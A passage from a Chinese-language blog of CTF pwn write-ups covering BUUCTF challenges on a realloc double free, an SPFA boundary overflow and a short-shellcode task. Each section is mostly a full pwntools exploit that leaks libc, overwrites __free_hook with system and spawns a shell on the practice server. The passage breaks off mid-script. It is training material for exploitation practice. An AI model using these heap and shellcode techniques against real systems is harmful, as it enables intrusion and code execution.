libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_hook<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x5a0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a\n'</span><span class="token punctuation">)</span>
<span class="token comment">#double free</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token comment">#4</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a\n'</span><span class="token punctuation">)</span><span class="token comment">#5</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'b\n'</span><span class="token punctuation">)</span><span class="token comment">#6</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00\n'</span><span class="token punctuation">)</span><span class="token comment">#7</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x5b0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#进入tcache</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x520</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x4f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x570</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a\n'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa\n'</span><span class="token punctuation">)</span><span class="token comment">#</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="31-BUU-ciscn-2019-es-5-realloc造成double-free"><a href="#31-BUU-ciscn-2019-es-5-realloc造成double-free" class="headerlink" title="31.BUU ciscn_2019_es_5(realloc造成double free)"></a>31.BUU ciscn_2019_es_5(realloc造成double free)</h2><p>2.27下的题目，没有一眼能看到的uaf或其他漏洞，但在add中，没有限制chunk的size，在edit中，使用了realloc函数来对chunk做修改，只能修改一次，如果修改时size为0，按照realloc特性，就会将chunk给free掉，再对这个chunk做一次真正的free，即可造成double free</p>
<p>关键代码：</p>
<p><img src="/images/image-20240911164614781.png"></p>
<p><img src="/images/image-20240911164637646.png"></p>
<p>同时，为了泄露libc，可以先提前构造一个进入unsortedbin的chunk，再申请小的chunk进行切割，以泄露libc</p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25889</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice:'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'size?>'</span>
add_content_words <span class="token operator">=</span> <span class="token string">'content:'</span>

menu_del <span class="token operator">=</span> <span class="token number">4</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Index:'</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Index:'</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Index:'</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'content:'</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

<span class="token comment"># debug()</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#0</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#1</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'cc'</span><span class="token punctuation">)</span><span class="token comment">#0切割残留</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ec0d0</span>
free_hook<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#realloc=>free</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#double free</span>

add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="32-BUU-mrctf2020-spfa（spfa算法，边界条件错误）"><a href="#32-BUU-mrctf2020-spfa（spfa算法，边界条件错误）" class="headerlink" title="32.BUU mrctf2020_spfa（spfa算法，边界条件错误）"></a>32.BUU mrctf2020_spfa（spfa算法，边界条件错误）</h2><p>挺有意思的题目，给了一个spfa最短路径算法，需要一点点的算法知识，但并不多，直接看题目更容易理解</p>
<p>有3个选项，1.添加边，输入from和to以及len，2.找到最短路径，就是一个spfa算法，3是getflag。其中输入有限制，不能</p>
<p><img src="/images/image-20240912100123929.png"></p>
<p><img src="/images/image-20240912100632381.png"></p>
<p>先来看3，*flag不能为-1即可，即dword_206CE0需要被修改，而没有别的地方会对dword_206CE0进行修改，所以我们可以知道，我们需要将其利用漏洞覆盖。</p>
<p><img src="/images/image-20240912100255933.png"></p>
<p><img src="/images/image-20240912100344198.png"></p>
<p>来看算法内部，其实不怎么看得懂，但最重要的一点就是list最大可以到1000，而第1000，刚好会把dword_206CE0，覆盖，存在一个边界漏洞</p>
<p><img src="/images/image-20240912100531789.png"></p>
<p>那么现在最大的问题就来了，怎么让其覆盖到list[1000]，我们的输入是有限制的，每个节点只能输入一次，且数量到不了1000，所以问了chatgpt，怎么让这个算法一直循环，得到的答案是构造一个零权重回路，即<code>1-&gt;2,2-&gt;1</code>两条edge的len都为0，就可以一直循环，就可以覆盖到list[1000]了。</p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26727</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span><span class="token string">b'1 2 0'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span><span class="token string">b'2 1 0'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'and to:'</span><span class="token punctuation">,</span><span class="token string">b'1 2'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="33-BUU-鹏城杯-2018-treasure（shellcode）"><a href="#33-BUU-鹏城杯-2018-treasure（shellcode）" class="headerlink" title="33.BUU 鹏城杯_2018_treasure（shellcode）"></a>33.BUU 鹏城杯_2018_treasure（shellcode）</h2><p>简单shellcode题目</p>
<p>首先题目给了一段shellcode放在sea段上的随机位置，导致最开始思路错误，</p>
<p><img src="/images/image-20240912162209777.png"></p>
<p>进入后先输入一个字节，然后可以输入9个字节的shellcode，并通过call rdx对输入的这个shellcode进行调用，虽然题目中有一个make_code_executable方法，只让10字节的可以执行，但看vmmap可以看到，整个code字段都是可以执行的。</p>
<p><img src="/images/image-20240912162314653.png"></p>
<p>因为题目给了一段shellcode，导致我以为目标是要跳转到那里去，用cdll来获得伪随机数，从而找到shellcode的位置，但看了一下那段shellcode，并不可以执行，所以不是这么做的，我们观察call rdx的时候的寄存器的值，rax为0，rdx为我们刚刚写的9字节shellcode地址，所以我们直接<code>xchg rsi,rdx</code>syscall,就可以构造一次很长的read，控制好位置写/bin/sh，我这里利用nop，让其执行到read的syscall后刚好到我们要覆盖的程ret位置，让rip继续执行后一次read写入的shellcode。后一次shellcode来syscall execve即可</p>
<p><img src="/images/image-20240912163551278.png"></p>
<p>第一次read9个字节的shellcode：</p>
<p><img src="/images/image-20240912164743315.png"></p>
<p>第二次read系统调用读入的shellcode：</p>
<p><img src="/images/image-20240912164818726.png"></p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28539</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token string">'b *0x400AB6'</span><span class="token punctuation">)</span>
<span class="token comment"># a=b'\x48\xB8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xB8\x2E\x63\x68\x6F\x2E\x72\x69\x01\x48\x31\x04\x24\x48\x89\x71\x21\xF6\x6A\x3B\x58\x0F\x05'</span>
<span class="token comment"># b=disasm(a)</span>
<span class="token comment"># lib=cdll.LoadLibrary("./libc-2.27.so")</span>
<span class="token comment"># seed=lib.time(0)</span>
<span class="token comment"># lib.srand(seed)</span>
<span class="token comment"># dis=lib.rand()%900</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'quit) :'</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
code<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
nop;
nop;
nop;
